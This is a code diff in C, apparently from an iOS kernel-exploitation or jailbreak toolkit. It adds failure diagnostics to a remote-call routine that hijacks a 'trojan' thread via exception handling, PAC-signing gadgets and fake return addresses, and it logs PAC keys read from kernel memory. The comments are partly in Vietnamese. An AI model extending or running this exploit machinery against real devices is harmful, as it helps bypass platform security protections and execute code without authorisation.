@@ -1023,17 +1023,44 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
         printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
     if(strcmp(name, "getpid") == 0 && retValue == 0) {
         uint64_t raisedBy = exception_thread_kaddr(&exc2);
-        // Disambiguates the three known failure shapes of the bootstrap
-        // call: senderThread != trojanThread → stray-thread interleave;
-        // pc == callPc → getpid never executed (PAC/PC reply rejected);
-        // pc == fakeLr → getpid ran but x0 was not the return value;
-        // senderThread == 0 → unidentifiable sender.
-        // Task 15: dumped on EVERY failure (was once-per-process, which hid
-        // later attempts from the device log).
+        // Disambiguates the known failure shapes of the bootstrap call.
+        // Task 18: giải mã THÀNH CHỮ ngay trong log để lần chạy tới không
+        // phải đoán:
+        //   pc-bad    — signed PC rác (remote_pac thất bại: gadget/key) hay
+        //               reply bị kernel từ → getpid chưa từng chạy;
+        //   pc==fakePc— thread vẫn loop ở trap gadget 0x101 = reply getpid
+        //               không có hiệu lực;
+        //   pc==callPc— getpid chưa chạy, re-fault tại chính nó;
+        //   pc==fakeLr— getpid chạy rồi nhưng x0 không phải retval;
+        //   stray     — exception đến từ thread khác trojan.
+        const char *shape = "unknown-shape";
+        if (exc2.threadState.__pc == 0 ||
+            exc2.threadState.__pc == 0xFFFFFFFFFFFFFFFFULL)
+            shape = "pc-bad (signed PC invalid — remote_pac failed or reply rejected; getpid NEVER ran)";
+        else if (exc2.threadState.__pc == (uint64_t)FAKE_PC_TROJAN_CREATOR)
+            shape = "pc==fakePc 0x101 (thread still looping at trap gadget — getpid reply had no effect)";
+        else if (exc2.threadState.__pc == pcAddr)
+            shape = "pc==callPc (re-fault at getpid itself — getpid NEVER ran)";
+        else if (exc2.threadState.__pc == (uint64_t)FAKE_LR_TROJAN_CREATOR)
+            shape = "pc==fakeLr 0x201 (getpid RAN but x0 is not the retval)";
+        else if (raisedBy && raisedBy != g_RC_trojanThreadAddr)
+            shape = "stray-sender (exception came from a non-trojan thread)";
         printf("[RemoteCall] getpid bootstrap diagnostics: ret=0 pc=%#llx lr=%#llx sp=%#llx callPc=%#llx fakeLr=%#llx senderThread=%#llx trojanThread=%#llx msgId=%u msgSize=%u\n",
                exc2.threadState.__pc, exc2.threadState.__lr, exc2.threadState.__sp,
                pcAddr, (uint64_t)FAKE_LR_TROJAN_CREATOR, raisedBy, g_RC_trojanThreadAddr,
                exc2.msgId, exc2.msgSize);
+        printf("[RemoteCall] getpid bootstrap SHAPE: %s\n", shape);
+        // Candidate PAC keys của trojan (đọc kernel thuần — an toàn): nếu
+        // giả thuyết offset rop/jop_pid sai trên A12/18.4-18.5 thì hai giá
+        // trị này sẽ là rác và lần phân tích log tới chốt được ngay.
+        if (g_RC_trojanThreadAddr) {
+            printf("[RemoteCall] trojan PAC-key candidates: rop@+%#x=%#llx jop@+%#x=%#llx pacSupported=%d gadget=%#llx\n",
+                   off_thread_machine_rop_pid,
+                   kread64(g_RC_trojanThreadAddr + off_thread_machine_rop_pid),
+                   off_thread_machine_jop_pid,
+                   kread64(g_RC_trojanThreadAddr + off_thread_machine_jop_pid),
+                   (int)gIsPACSupported, g_RC_gadgetPacia);
+        }
         printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
         g_RC_success = false;
     }
